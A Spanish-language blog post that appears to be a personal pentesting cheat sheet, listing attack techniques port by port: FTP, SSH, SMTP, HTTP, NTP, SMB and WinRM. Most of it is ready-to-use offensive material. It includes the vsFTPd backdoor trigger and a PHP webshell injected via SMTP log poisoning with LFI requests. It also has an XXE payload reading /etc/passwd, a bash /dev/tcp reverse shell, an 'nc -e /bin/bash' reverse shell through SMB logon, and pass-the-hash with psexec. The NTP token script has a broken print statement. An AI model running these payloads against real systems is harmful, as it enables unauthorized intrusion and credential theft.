---
layout: single
title: Explotacion de puertos.
excerpt: "Aqui veremos como explotar algunas vulnerabilidades dependiendo del puerto que se este auditando."
date: 2022-11-20
classes: wide
header:
  teaser_home_page: true
categories:
  - Pentesting
  - Ethical Hacking
tags:
  - FTP
  - SSH
  - WinRM
  - SMB
  - Puertos
  - HTTP/HTTPS
---

Sino sabes por donde empezar al momento de encontrarte con uno de estos puertos aqui te enseño algunas cosas que deberias de probar cuando estes auditando.

## 21 FTP (File Transfer Protocol)
Protocolo para la tranferencia remota de archivos.
Cuando el puerto 21 este abierto puedes intentar conectarte como el usuario anonymous.
Debes especificar el protocolo seguido de la ip-address víctima. Posteriormente ingresas en el campo username anonnymous y en password lo dejas vacio dando solo enter.
```
 ftp <ip-address> -> username: anonymous
 		     password: 
```	  
Estos son algunos de los comandos que puedes utilizar una vez estes conectado al puerto ftp.
	dir -> Ver los directorios compartidos
        ls -la -> Listar por archivos ocultos
        put name_file -> Verificar si se tiene capacidad de escritura y así modificar un archivo de la maquina
		Ej; put file | put /etc/passwd
  
En caso de que se alla detectado la versión vsFTPd 2.3.44 al hacer el escaneo, debes buscar con la herramienta searchsploit un exploit que te permita explotar un backdoor que tiene esa versión que te permiterá ejecutar comandos de forma remota como el enviarte una reverse shell para ganar acceso al sistema. 

Con searchsploit -x unix/remote/49757.py examinas el contenido del exploit para ver como se usa o si tienes que modificar algunos parametros.

Con searchsploit -m unix/remote/49757.py copias el exploit a la ruta actual de trabajo.
```
searchsploit vsFTPd 2.3.44 -> unix/remote/49757.py -> Backdoor Command Execution
          nc <ip-address> 21 -> USER test:)
	  		     -> PASS pass
          ftp <ip-address> -> test:) 
	  		   -> pass
```
<br><br>
## 22 SSH (Secure Shell)
Protocolo usado para conectarse de forma remota a un servidor de forma segura.

Existe un exploit que te ayuda a enumerar usuarios existentes en un servidor si la versión esta entre 2.3 < 7.7. 

Solo se ejecuta el exploit con python y se le indica la ip-address víctima.
```
searchsploit username enumeration -> OpenSSH 2.3 < 7.7 - Username Enumeration ----- linux/remote/45233.py
python2 45233.py <ip-address>
```
<br><br>
## 25 SMTP (Simple Mail Transfer Protocol).
Protocolo de red de texto plano utilizado para enviar y recibir correos electrónicos lo que hace que las comunicaciones entre el cliente de correo y el servidor de correo puedan ser legibles para cualquier persona que interprete la comunicación. Para evitar esto se utilizan protocolos de cifrado como STARTTLS o DMARC.<br>
Cuando un usuario envía un correo electrónico, su cliente de correo (ya sea Outlook o Gmail) utiliza SMTP para enviar el mensaje al servidor de correo destinatario.<br>
SMTP solo se encarga de enviar correos electrónicos, no los almacena ni los muestra al usuario final, para esto se utilizan los protocolos POP3 y IMAP.<br>
Puedes conectarte a la máquina usando telnet para enviar un correo electrónico a un usuario válido dentro del sistema el cual contenga código malicioso php y ver si se acontece un log poisoning y ejecutar comandos de forma remota "RCE" (Remote Code Execution), todo esto en caso de que no requiera de autenticación al momento de conectarse.
```
telnet <ip-address> 25
```
Una vez conectado, esta sería la estructura básica para enviar un correo por SMTP.
```
MAIL FROM: <username>	# MAIL FROM: es para específicar el remitente del correo.
RCPT TO: <username>	# RCPT TO: es para indicar el resceptor del correo pero este tipo que ser un usuario válido dentro del sistema.
DATA			# Poner DATA y luego dar enter para introducir el código.
<?php system($_GET['cmd']); ?>	# Códido php para aplicar un RCE mediante el parametro cmd.
.			# Al termino del correo se debe finalizar con un punto.

QUIT			# Cortar la conexión.
```
Ya solo queda revisar los logs para veríficar que se haya guardado correctamente en la ruta /var/mail/<username>, mediante un LFI (Local File Inclution) o alguna otra vulnerabilidad encontrada (Log poisoning).<br>
Este sería un ejemplo desde consola usando el comando curl para tramitar la petición.
```
curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"

# helios es el nombre de usuario al cual se le envió en correo.
# -s -> Indica que la petición se realizará en formato silencioso. 
# -X -> Este parametro es para específicar el método por el cual se tramitará la petición que en este caso se usa el método GET.
# &cmd=whoami -> Concatenación del parámetro cmd para inyectar el comando whoami y ver si se tiene ejecución remota de comandos "RCE".
```
Para hacer esto desde el sitio web solo basta con poner la url donde se acontece el LFI seguido del parámetro cmd para inyectar los comandos.<br>
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/<username>&cmd=whoami
<br><br>
## 80 HTTP (Hypertext Transfer Protocol)
Protocolo usado para montar sitios web.
Con la herramienta whatweb puedes ver informacion acerca del sitio web como que tipo de CMS "Control Management System" se esta usando ya sea joomla, wordpress o drupal, con que tipo de lenguaje esta programado (php, python, java etc). Tambien puedes ver esta información con wappalyzer que es un plugin que puedes instalar en tu navegador.
```
whatweb http://<ip-addres>
```
<br>
Si hay un escaner de url en el sitio web, crea un archivo y ve si el contenido del archivo te lo muestra en la página al subirlo, prueba si te interpreta codigo php injectando un comando.
```
nvim test -> <?php system("whoami"); ?>
http://<ip-addres>/test

Listar el phpinfo para ver las funciones que estan deshabilitadas.
http://<ip-address>/test -> test = <?php phpinfo(); ?>

Intentar escanear la url de la maquina junto con los puertos que tiene abiertos para verificar si hay informacion expuesta o si exiten mas puertos abiertos internamente.
http://127.0.0.1:443
http://localhost:5000
```  
<br>
Si hay un campo para subir archivos probar subiendo un archivo.txt para verificar si se esta aplicando sanitización, en caso de que no se esta validando el tipo de archivo que se sube puedes subir un archivo.php malicioso para enviarte una reverse shell.
```
nvim reverse_shell.php -> bash -c 'bash -i >& /dev/tcp/<ip-address>/443 0>&1'
```
<br>
Si se aplica validación en archivos.xml se puede acontacer un XXE si el contenido del archivo.xml te lo muestra en la web tal cual. 

Puedes leer el /etc/passwd para ver los usarios que hay en el sistema.

Leer el /proc/net/fib_trie para verificar que no alla contenedores en la maquina víctima.

Listar el /proc/net/tcp para ver los puertos que estan abiertos internamente en la maquina.

Listar la id_rsa del usario para conectarse por ssh sin proporcionar contraseña (/home/<user>/.ssh/id_rsa).
```
<?xml version="1.0" encoding="ISO-8859-1"?>
          <!DOCTYPE foo [  
          <!ELEMENT foo ANY >
          <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    
          <post>
                  <title>Example Post</title>
                  <description>Example Description</description>
                  <markdown>&xxe;</markdown>
          </post>
```



## UPD 123 NTP (Network Time Protocol)
Protocolo utilizado para sincronizar el reloj de las maquinas conectadas. En ocasiones algunos ataques no suele funcionar sino esta sincronizada tu hora con la de la maquina víctima.

Ver si el puerto 123 esta abierto por UDP.
```
nmap --top-ports 500 --open -sU -t5 -vvv -n -Pn <ip-address> -oG udpPorts 
```


Detectar el servicio que corre en el puerto 123 al igual que la diferencia de tiempo entre tu maquina y la maquina victima.
```
nmap -sU -sCV -p123 ip-address -oN targeted
```


Se requiere instalar las siguientes librerías:
```
pip3 install pyotp ntplib
```


Sincronizar tu hora a la de la maquina víctima de forma temporal para obtener un TOTP.

``` 
	#!/usr/bin/python3
	import pyotp
	import ntplib
	from time import ctime
  
        client = ntplib.NTPClient()
        response = client.request("ip-address")
        totp = pyotp.TOTP("aqui_va_otp_token")
  
        print("El token es -> " % totp.at(response.tx_time))
```



## 135 MSRPC
<br><br>
## 443 HTTPS (Hypertext Transfer Protocol Secure)
Inspeccionar el certificado en busca de información relevante, como si se esta aplicando virtual hosting "Common Name" o para ver que emails estan registrados.
```
openssl s_client -connect <ip-address>:443
```
<br><br>
## 139/445 SMB (Server Message Block)
Protocolo de red que controla el acceso a archivos y directorios en Microsoft Windows. Tambien permite el acceso a recursos compartidos en la red como impresoras, routers e interfaces de red abiertas.<br>
Con este comando puedes ver el nombre de la maquina víctima (Si es controlador del dominio "DC-Admin"), la versión de windows que se esta utilizando y si el SMB esta firmado.
```
crackmapexec smb <ip-address>
```
<br>
Una vez obtenido un usario y contraseña puedes ver si son válidos a nivel de sistema si te pone un [+] en el output.
```
crackmapexec smb <ip-address> -u 'user' -p 'password'
```
<br>
Listar los recursos compartidos que existen a nivel de red empleando un null session sino no se cuenta con credenciales válidas.
```
crackmapexec smb <ip-address> -u 'null' -p ' ' --shares
```
<br>
Hacer PassTheHash para comprobar que le hash que se tiene es del usario administrator y asi poder ganar acceso al
sistema sin proporcionar la contraseña con la herramienta psexec.py
```
crackmapexec smb <ip-address> -u 'Administrator' -H ':<hash>'
```
<br>
Si ya tienes el hash NTLM ejecuta el siguiente comando y obtendras una consola como el usario nt/authority/system.
```
psexec.py WORKGROUP/Administrator@<ip-address> -hashes :<HashNTLM>
```
<br>
Listar los recursos compartidos que hay a nivel de red.
```
smbmap -H <ip-address>
# -H -> Especificar la dirección IP.
```
<br>
Listar los recursos compartidos haciendo uso de un null session.
```
smbmap -H <ip-address> -u 'null'
# -u -> Indicar un usuario.
```
<br>
Listar los recursos compartidos teniendo un usuario y una contraseña validos.
```
smbmap -H <ip-address> -u <username> -p <password>
```
<br>
Especificar el nombre del recurso del servidor al cual se desea conectar.
```
smbmap -H <ip-address> -r <resourcename>
# -r -> Especificar la ruta del recurso al que se quiere conectar.
```
<br>
Descargar un recurso compartido a la ruta actual.
```
smbmap -H <ip-address> --download <resourcename>/<filename>
```
<br>
Listar recursos de la maquina.
```
smbclient -L <ip-address> -N 
```  
En caso de que se presente el error: protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED al querer listar los recursos de la maquina ejecuta el siguiente comando para solucionarlo.
```
smbclient -L ipaddress -N --option 'client min protocol = NT1'
```
<br>
Conectarse a un recurso de la maquina víctima.
```
smbclient //<ip-address>/name_resource -N --option 'client min protocol = NT1'
Ej; smbclient //<ip-address>/tmp -N --option 'client min protocol = NT1'
```
<br>
Una vez conectado a un recurso de la maquina ver si esta habilitado el comando logon con help. Si está habilitado te puedes enviar una reverse shell poniendote en escucha con ncat por el puerto 443.
```
sudo rlwrap ncat -nlvp 443

logon "/='nohup nc -e /bin/bash <ip-address> 443'"
```
<br><br>
## 5985 WinRM (Windows Remote Management)
La administracion remota de windows permite que los sistemas accedan o intercambien información de gestión a través de una red común.

Para poderte conectar a los servicios remotos de windows primero debes comprobar que el usario forme parte del grupo Remote Managment User con la herramiente crackmapexec.

Si al final de la ejecucion te pone un [+] pwned! significa que el usuario forma parte del grupo Remote Management User.
```
crackmapexec winrm 10.10.11.108 -u 'user' -p 'password' -> [+] pwn3d!
```
  

Ya solo queda conectarse al servicio remoto de windows con la herramienta evil-winrm.
```
evil-winrm -i <ip-address> -u 'user' -p 'password'
```



